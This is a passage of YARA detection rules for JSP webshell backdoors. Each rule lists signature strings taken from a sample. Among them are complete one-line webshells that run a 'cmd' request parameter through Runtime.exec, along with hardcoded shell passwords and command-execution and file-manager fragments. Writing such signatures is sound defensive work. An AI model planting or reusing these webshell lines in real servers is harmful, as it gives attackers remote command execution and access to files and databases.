        hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
    strings:
        $s1 = "xxxx@Gmail.com" fullword ascii
        $s2 = "String[] authorInfo={\" <font color=red>  </font>\",\" <font color=red> </font>\"};" fullword ascii
        $s3 = "String[] strSysProperty  = {\"\",\"System Property\"};" fullword ascii
        $s4 = "private final static int languageNo=0; //" fullword ascii
        $s5 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
        $s6 = "<li><a href=\"http://www.smallrain.net\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lan" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 80KB and ( all of them ) ) or ( all of them )
}

rule d15271811cfea64a1c1a76017a3dd668f60f1b98
{
    meta:
        description = "jsp - file d15271811cfea64a1c1a76017a3dd668f60f1b98.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f84187222d55b12ae1c0dbf8915bcd5a80b066b351113b67371e6f9433da5b20"
    strings:
        $s1 = "</p><p>Recoding by Juliet From:<a href=\"http://blackbap.org\">Silic Group Inc.</a></p>" fullword ascii
        $s2 = "<center>All Rights Reserved, <a href=\"http://blackbap.org\" target=\"_blank\">blackbap.org</a> &copy; Silic Group Inc.</center>" ascii
        $s3 = "<li><a href=\"http://www.blackbap.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s4 = "<li><a href=\"http://www.blackbap.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s5 = "String[] authorInfo={\"<font color=red>Silic Group</font>\"};" fullword ascii
        $s6 = "private final static int languageNo=0;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 80KB and ( all of them ) ) or ( all of them )
}

rule b11440638084ab162d5759d23f881ea0fc13a28b
{
    meta:
        description = "jsp - file b11440638084ab162d5759d23f881ea0fc13a28b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "517e2b635d256ba25c0acf27bc3ce94f63923400096cf71ce58d29326217192d"
    strings:
        $x1 = "i).isCanExecute() %>');\"><%=fileList.get(i).isCanExecute()?\"True\":\"False\" %></a></td>" fullword ascii
        $x2 = "p = Runtime.getRuntime().exec(\"cmd /c \"+command);" fullword ascii
        $x3 = "<td><span style=\"float:right;\">JVM Version:<%=prop.getProperty(\"java.vm.version\")%></span> <a href=\"javascript:goaction('lo" ascii
        $x4 = "<td><span style=\"float:right;\"><a href=\"http://www.whylover.com\" target=\"_blank\">JSPROOT Ver: 2010</a></span> Host:<%=requ" ascii
        $x5 = "public Object getConnection(String dbType,String localhost,String dbName,String username,String password,String encode){" fullword ascii
        $x6 = "out.setComment(Utils.convertStringEncode(\"This zip file Make By JSPROOT,http://www.whylover.com\",\"UTF-8\"));" fullword ascii
        $s7 = "<td><span style=\"float:right;\"><a href=\"http://www.whylover.com\" target=\"_blank\">JSPROOT Ver: 2010</a></span> Host:<%=requ" ascii
        $s8 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"><title>JSPRoot</title>" fullword ascii
        $s9 = "<a href=\"javascript:goaction('file','list','<%=driver.get(i).getFileName() %>');\" title=\"Driver(<%=driver.get(i).get" fullword ascii
        $s10 = "n','','');\">DataManager Manager</a> | <a href=\"javascript:goaction('shell','','net user');\">Execute Command</a> |  <a href=\"" ascii
        $s11 = "<td noWrap><a href=\"javascript:filestatus('<%=currentPath %>','<%=fileList.get(i).getFileName() %>','r','<%=!fileList.get(i).is" ascii
        $s12 = "<td noWrap><a href=\"javascript:zipfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');\">Zip</a> | <a href=" fullword ascii
        $s13 = "<td noWrap><a href=\"javascript:downfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');\">Down</a> | <a hre" fullword ascii
        $s14 = "t.getServerName() %> | Host IP:<%=request.getRemoteAddr() %> | OS: <%=prop.getProperty(\"os.name\")%> </td>" fullword ascii
        $s15 = "<td><a href=\"javascript:openfile('<%=currentPath %>','<%=fileList.get(i).getFileName() %>');\"><%=fileList.get(i).getFi" fullword ascii
        $s16 = "<td><h2>File Manager - Current disk free <%=free %> G of <%=total %> G (<%=Utils.getRate(total,free) %>)</h2>" fullword ascii
        $s17 = "return DriverManager.getConnection(dbUrl,username,password);" fullword ascii
        $s18 = "<input type=\"text\" value=\"127.0.0.1:1433\" name=\"localhost\" id=\"mssql_localhost\" class=\"input\"/> DBUser" fullword ascii
        $s19 = "<td><a href=\"javascript:goaction('file','list','<%=currentPath+fileList.get(i).getFileName() %>');\"><%=fileList.get(i)" fullword ascii
        $s20 = "button\" value=\"Exec\" onClick=\"javascript:execute();\">" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_38b48a655a53fec64c10fc119e46c443446d6b10
{
    meta:
        description = "jsp - file 38b48a655a53fec64c10fc119e46c443446d6b10.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3d192c949b8ae3da720884c66c19358246b46e38798bec40a1ad94da65a9034d"
    strings:
        $s1 = "private static final String PW = \"ninty\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_0098e0be088433955fa05a1717f360538112339e
{
    meta:
        description = "jsp - file 0098e0be088433955fa05a1717f360538112339e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6ce16f41d53982aecca4076630d5fd6bff0f6ae6938430af1dbfb9cbac0e67f8"
    strings:
        $x1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword ascii
        $x2 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword ascii
        $s3 = "BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));" fullword ascii
        $s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword ascii
        $s5 = "<INPUT name='cmd' type=text>" fullword ascii
        $s6 = "if(cmd != null) {" fullword ascii
        $s7 = "while((s = sI.readLine()) != null) {" fullword ascii
    condition:
        ( uint16(0) == 0x2f2f and filesize < 1KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_2f7b4343c3b3387546d5ce5815048992beab4645
{
    meta:
        description = "jsp - file 2f7b4343c3b3387546d5ce5815048992beab4645.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2b6e0dd793daf6b163dcd0cd46e5dc80c7b7538129fa36a9cb77c348a37eb9ae"
    strings:
        $x1 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
        $x2 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
        $s3 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s4 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s5 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s7 = "System.out.println(strCommand);" fullword ascii
        $s8 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
        $s9 = "strCommand[1]=strShell[1];" fullword ascii
        $s10 = "strCommand[0]=strShell[0];" fullword ascii
        $s11 = "//Properties prop = new Properties(System.getProperties());  " fullword ascii
        $s12 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+strSeparator+\"','','','1','');\\\">\");" fullword ascii
        $s13 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s14 = "<title>JFoler 1.0 ---A jsp based web folder management tool by Steven Cee</title>" fullword ascii
        $s15 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s16 = "//out.println(path + f1.getName());" fullword ascii
        $s17 = "String[] strCommand=new String[3];" fullword ascii
        $s18 = "private final static int languageNo=1; //Language,0 : Chinese; 1:English" fullword ascii
        $s19 = "out.println(\"error,upload \");" fullword ascii
        $s20 = "strShell[0]=\"/bin/sh\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_37ca8aec7ed07d8c6bdcfb2b97416745f7870f7e
{
    meta:
        description = "jsp - file 37ca8aec7ed07d8c6bdcfb2b97416745f7870f7e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
    strings:
        $x1 = "I</a> and welcome to <a href=\"http://bbs.hksxs.com\" target=\"_blank\">" fullword ascii
        $s2 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s3 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s4 = "<td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s5 = "<td align=\"right\">created by <a href=\"mailto:zhangliaozhi@vip.qq.com\">`" fullword ascii
        $s6 = "private String _password = \"ceshi2009\";" fullword ascii
        $s7 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s8 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s9 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s10 = "document.dbInfo.sql.value = \\\"\\\";\";" fullword ascii
        $s11 = "<textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s12 = "<input type=\"password\" size=\"25\" name=\"password\" class=\"textbox\" />" fullword ascii
        $s13 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s14 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s15 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s16 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s17 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s18 = "\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
        $s19 = "selectedFile.style.backgroundColor = \\\"#FFFFFF\\\";\\n\";" fullword ascii
        $s20 = "if (folderName != null && folderName != false && ltrim(folderName) != \\\"\\\") {\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_32c3066548f3254ab3d0bc1a3e78ebd774fcef4a
{
    meta:
        description = "jsp - file 32c3066548f3254ab3d0bc1a3e78ebd774fcef4a.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
    strings:
        $s1 = "</p><p>Recoding by Juliet From:<a href=\"http://blackbap.org\">Silic Group Inc.</a></p>" fullword ascii
        $s2 = "<center>All Rights Reserved, <a href=\"http://blackbap.org\" target=\"_blank\">blackbap.org</a> &copy; Silic Group Inc.</center>" ascii
        $s3 = "<li><a href=\"http://www.blackbap.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s4 = "<li><a href=\"http://www.blackbap.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s5 = "String[] authorInfo={\"<font color=red>Silic Group</font>\"};" fullword ascii
        $s6 = "private final static int languageNo=0;" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 80KB and ( all of them ) ) or ( all of them )
}

rule da2336a99bee703b174c263d5ef2365399f3316e
{
    meta:
        description = "jsp - file da2336a99bee703b174c263d5ef2365399f3316e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
    strings:
        $s1 = "\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
        $s2 = "private static final String PW = \"avvcd\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_7e3545b63eead01a8f509cdd5304e78d6ae1a047
{
    meta:
        description = "jsp - file 7e3545b63eead01a8f509cdd5304e78d6ae1a047.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "91de9ba378e4bd757dad532d7c5a0b59c2404d29d7c20332bc167e3134bc64db"
    strings:
        $x1 = "\"welcome to pwnshell! - <a target='_new' href='http://i8jesus.com/stuff/pwnshell/'>http://i8jesus.com/stuff/pwnshell</a><br/>\"" ascii
        $x2 = "\"welcome to pwnshell! - <a target='_new' href='http://i8jesus.com/stuff/pwnshell/'>http://i8jesus.com/stuff/pwnshell</a><br/>\"" ascii
        $x3 = "* Copyright 2010, AUTHORS.txt (http://jqueryui.com/about)" fullword ascii
        $x4 = "\"\",d]);this._datepickerShowing=false;this._lastInput=null;if(this._inDialog){this._dialogInput.css({position:\"absolute\",left" ascii
        $x5 = ";b.datepicker._updateDatepicker(a)}}catch(d){b.datepicker.log(d)}return true},_showDatepicker:function(a){a=a.target||" fullword ascii
        $s6 = "false;C.onload=C.onreadystatechange=function(){if(!B&&(!this.readyState||this.readyState===\"loaded\"||this.readyState===\"compl" ascii
        $s7 = "(this._dialogInput,false);a.settings={};b.data(this._dialogInput[0],\"datepicker\",a)}g(a.settings,i||{});d=d&&d.constructor==" fullword ascii
        $s8 = "lass,d.dpDiv));h[0]?b.datepicker._selectDay(a.target,d.selectedMonth,d.selectedYear,h[0]):b.datepicker._hideDatepicker();" fullword ascii
        $s9 = "sb.append(\"<span class='directory'><a class='dirs' href='javascript:goToDirectory(\\\"\" + encoded + \"\\\")'>\");" fullword ascii
        $s10 = "Process p = Runtime.getRuntime().exec(" fullword ascii
        $s11 = "){xa=true;if(s.readyState===\"complete\")return c.ready();if(s.addEventListener){s.addEventListener(\"DOMContentLoaded\"," fullword ascii
        $s12 = "<% /* pwnshell.jsp - www.i0day.com */ %>" fullword ascii
        $s13 = "e(a.target);h=a.ctrlKey||a.metaKey;break;case 36:if(a.ctrlKey||a.metaKey)b.datepicker._gotoToday(a.target);h=a.ctrlKey||" fullword ascii
        $s14 = "String finalPath = getExecutableFromPath(cmd);" fullword ascii
        $s15 = "rentMonth,a.currentDay));return this.formatDate(this._get(a,\"dateFormat\"),d,this._getFormatConfig(a))}});b.fn.datepicker=" fullword ascii
        $s16 = "ce&&V.test(i)&&r.insertBefore(b.createTextNode(V.exec(i)[0]),r.firstChild);i=r.childNodes}if(i.nodeType)e.push(i);else e=" fullword ascii
        $s17 = "private String getExecutableFromPath(String executableName) {" fullword ascii
        $s18 = "ion(a){var b,d,f,e;a=arguments[0]=c.event.fix(a||A.event);a.currentTarget=this;b=a.type.indexOf(\".\")<0&&!a.exclusive;" fullword ascii
        $s19 = "t\",\"width\"];j=j?[i.width(),i.height()]:[i.height(),i.width()];var q=/([0-9]+)%/.exec(a);if(q)a=parseInt(q[1],10)/100*" fullword ascii
        $s20 = "tring\")e.data=c.param(e.data,e.traditional);if(e.dataType===\"jsonp\"){if(n===\"GET\")N.test(e.url)||(e.url+=(ka.test(e.url)?" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 800KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _home_chenzhongxiang_test_webshell_sample_jsp_s01
{
    meta:
        description = "jsp - file s01.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3f3275ac66bd2063b23c883d1dca7084b199074d6b2ec74236533178a4db67a8"
    strings:
        $s1 = "<% Runtime.getruntime().exec(request.getParameter(\"cmd\")) %>" fullword ascii
    condition:
        ( uint16(0) == 0x3c0a and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_958ffda1155a5fc1b0970faac8f7dde2a6e30e49
{
    meta:
        description = "jsp - file 958ffda1155a5fc1b0970faac8f7dde2a6e30e49.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "35c8c39aaf8e0b14e53459d2203705cde46e56a3464c57f7a400448d86c3e45e"
    strings:
        $s1 = "ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
        $s2 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
        $s3 = "ResultSet r = m.executeQuery(q);" fullword ascii
        $s4 = "response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
        $s5 = "Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
        $s6 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
        $s7 = "sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
        $s8 = "sb.append(d.getColumnName(i) + \" (\" + d.getColumnTypeName(i)" fullword ascii
        $s9 = "String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
        $s10 = "String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
        $s11 = "sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
        $s12 = "String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
        $s13 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword ascii
        $s14 = "ResultSet r = c.getMetaData().getCatalogs();" fullword ascii
        $s15 = ".charAt(i + 1))));" fullword ascii
        $s16 = ".write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d" fullword ascii
        $s17 = "void FF(String s, HttpServletResponse r) throws Exception {" fullword ascii
        $s18 = "}//new String(s.getBytes(\"ISO-8859-1\"),c);}" fullword ascii
        $s19 = "new InputStreamReader(new FileInputStream(new File(" fullword ascii
        $s20 = "void QQ(String cs, String s, String q, StringBuffer sb) throws Exception {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule a04003c2dfca3bdd0ebf1a641e49cce34b4b1b5d
{
    meta:
        description = "jsp - file a04003c2dfca3bdd0ebf1a641e49cce34b4b1b5d.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f9eb64c48791e1ee5226c6ef0e733b75240721a099fff860c7e2f28e5191c906"
    strings:
        $s1 = "t=t=t=t=t=t=t=<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%>" fullword ascii
        $s2 = "String Pwd=\"cmd\";" fullword ascii
    condition:
        ( uint16(0) == 0x3d74 and filesize < 20KB and ( all of them ) ) or ( all of them )
}

rule fa9997cb67fe248ef67d8bbcf6ebeecd1707818c
{
    meta:
        description = "jsp - file fa9997cb67fe248ef67d8bbcf6ebeecd1707818c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1b4f4005e8875436be8f477427d977e811130dfcc18f627915a7c5e80a5696e5"
    strings:
        $s1 = "out.println(\"<a href='\"+request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+request.getReq" fullword ascii
        $s2 = "<font color=\"blue\">??????????????????:</font><%out.print(request.getRealPath(request.getServletPath())); %>    " fullword ascii
        $s3 = "String context=new String(request.getParameter(\"context\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
        $s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\"),\"gb2312\");    " fullword ascii
        $s5 = "<form name=\"frmUpload\" method=\"post\" action=\"\">    " fullword ascii
        $s6 = "uestURI()+\"'><font color='red' title='???????????????????????????????????????!'>????????????!</font></a>\");    " fullword ascii
        $s7 = "??????????????????:<textarea name=\"context\" id=\"context\" style=\"width: 51%; height: 150px;\"></textarea>    " fullword ascii
        $s8 = "<%@page import=\"java.io.*,java.util.*,java.net.*\"%>    " fullword ascii
    condition:
        ( uint16(0) == 0x3c0a and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule bcb6d19990c7eba27f5667d3d35d3a4e8a563b88
{
    meta:
        description = "jsp - file bcb6d19990c7eba27f5667d3d35d3a4e8a563b88.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3cae1bd3d766c1499b4689efd84bc45b12de8d6201041a029c71752c08429db3"
    strings:
        $x1 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='example d:\\\\cmd.exe /c dir c:'></td><td><inp" fullword ascii
        $x2 = "out.print(\"<td colspan=2>filepath:<input name=execFile size=75 type=text title='example d:\\\\cmd.exe /c dir c:'></td><td><inpu" ascii
        $x3 = "out.println(\"<tr><td bgcolor=menu><a href='http://blog.csdn.net/kj021320' target=FileFrame>About nonamed(kj021320)</a></td><" fullword ascii
        $x4 = "out.print(\"<td>SqlCmd:<input type=text name=sqlcmd title='select * from admin'><input name=run type=submit value=Exec></td>\"" fullword ascii
        $x5 = "out.print(\"<td colspan=2>file:<input name=file type=file>up to file<input title='d:\\\\1.txt' name=UPaddress size=35 type=text" fullword ascii
        $x6 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=T target=FileFrame>\"+ico(53)+\"SystemTools</a></td></tr>\");" fullword ascii
        $s7 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>OpenTheHttpProxy</a></td></tr>\");" fullword ascii
        $s8 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>CloseTheHttpProxy</a></td></tr>\");" fullword ascii
        $s9 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=S target=FileFrame>\"+ico(53)+\"SystemInfo(System.class)</a></td></tr>\");" fullword ascii
        $s10 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=L target=FileFrame>\"+ico(53)+\"ServletInfo</a></td></tr>\");" fullword ascii
        $s11 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=i target=FileFrame>\"+ico(57)+\"Interfaces</a></td></tr>\");" fullword ascii
        $s12 = "out.println(\"<tr bgcolor=menu><td><a href=\\\"javascript:top.address.FolderPath.value='\"+folderReplace(f[i].getAbs" fullword ascii
        $s13 = "out.print(Runtime.getRuntime().availableProcessors()+\" <br>\");" fullword ascii
        $s14 = "out.print(\"<tr><form method=post action='?Action=IPscan'><td bordercolorlight=Black bgcolor=menu>Scan Port</td><td>IP:<input" fullword ascii
        $s15 = "out.println(\"<tr><td bgcolor=menu><a href='http://blog.csdn.net/kj021320' target=FileFrame>About nonamed(kj021320)</a></td></tr" ascii
        $s16 = "\"<form name=login method=post>username:<input name=LName type=text size=15><br>\" +" fullword ascii
        $s17 = "out.print(\"<form name=address method=post target=FileFrame onSubmit='checkUrl();'>\");" fullword ascii
        $s18 = "con=DriverManager.getConnection(url,userName,passWord);" fullword ascii
        $s19 = "\"password:<input name=LPass type=password size=15><br><input type=submit value=Login></form></center>\");" fullword ascii
        $s20 = "out.print(\"Driver:<input name=driver type=text>URL:<input name=conUrl type=text>user:<input name=user type=text size=3>passw" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule d54cc912a2c626c17569b48b10e9f38c0556b7b6
{
    meta:
        description = "jsp - file d54cc912a2c626c17569b48b10e9f38c0556b7b6.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d77f3332083ca55d0cc730c39970b6413430e986c6adae9ece72cceb640da27b"
    strings:
        $s1 = "\" name=\"url\"><br><textarea rows=\"20\" cols=\"80\" name=\"smart\">" fullword ascii
        $s2 = "utStream\"/><jsp:directive.page import=\"java.io.FileOutputStream\"/><% int i=0;String method=request.getParameter(\"act\");if(m" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_5f101042f718ec10bb60633b7dd61d7b751f1260
{
    meta:
        description = "jsp - file 5f101042f718ec10bb60633b7dd61d7b751f1260.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4a6736d3e652b01fe3953f3b49b394448cbe5c49106ee9638a33d4320eb26580"
    strings:
        $s1 = "self.webshell_txt_7 = '<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%@include file=\"1t00ls" fullword ascii
        $s2 = "self.webshell_txt_2 = '<%! else{sF+=l[i].getName()+\"\\t\"+sT+\"\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\";}}sb.append(sF);}" fullword ascii
        $s3 = "self.webshell_txt_4 = '<%!void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(\"\\r\\n\");Connection" fullword ascii
        $s4 = "self.webshell_txt_3 = '<%!void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDa" fullword ascii
        $s5 = "self.webshell_txt_6 = '<%else if(Z.equals(\"D\")){BufferedWriter pi=new BufferedWriter(new OutputStreamWriter(new FileOutp" fullword ascii
        $s6 = "while(r.next()){sb.append(r.getString(\"TABLE_NAME\")+\"\\t\");}r.close();c.close();}%>'" fullword ascii
        $s7 = "self.webshell_txt_7 = '<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%@include file=\"1t00ls.jsp" ascii
        $s8 = "self.webshell_txt_1 = '<%!" fullword ascii
        $s9 = "while((l=br.readLine())!=null){sb.append(l+\"\\r\\n\");}br.close();}%>'" fullword ascii
        $s10 = "self.webshell_txt_5 = '<%" fullword ascii
        $s11 = "self.webshell_txt_4 = '<%!void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(\"\\r\\n\");Connection c=G" ascii
        $s12 = "self.webshell_txt_3 = '<%!void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat" ascii
        $s13 = "self.webshell_txt_6 = '<%else if(Z.equals(\"D\")){BufferedWriter pi=new BufferedWriter(new OutputStreamWriter(new FileOutputStre" ascii
        $s14 = "%@include file=\"6t00ls.jsp\"%>'" fullword ascii
        $s15 = "teFormat(\"yyyy-MM-dd HH:mm:ss\");" fullword ascii
    condition:
        ( uint16(0) == 0x2020 and filesize < 20KB and ( 8 of them ) ) or ( all of them )
}

rule b3907f726d5ce1f20eafb085e8aaf39453e78c17
{
    meta:
        description = "jsp - file b3907f726d5ce1f20eafb085e8aaf39453e78c17.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "84588230bd7d4dbfd3c3544c54e31a0348c614b6c9ad2fd78334cc04dbf16164"
    strings:
        $s1 = "private static final String PW = \"ninty\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule sig_8fd343db0442136e693e745d7af1018a99b042af
{
    meta:
        description = "jsp - file 8fd343db0442136e693e745d7af1018a99b042af.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dd5c14e22f032c6b04d972d3c7377005a90f9da053707fc126f9e5bcc52a162c"
    strings:
        $s1 = "<%=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_6d965191607e37758232050b5b44ae9380cf9593
{
    meta:
        description = "jsp - file 6d965191607e37758232050b5b44ae9380cf9593.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5602d8a781e9f917886d7f84c713554c4d485a276fdab0744790e6b260610202"
    strings:
        $s1 = "String ExecuteCommandCode(String cmdPath, String command) throws Exception {" fullword ascii
        $s2 = "sb.append(ExecuteCommandCode(pars[1], pars[2]));" fullword ascii
        $s3 = "CopyFileOrDirCode(sourceFilePath + \"/\" + z[j].getName(), targetFilePath + \"/\" + z[j].getName());" fullword ascii
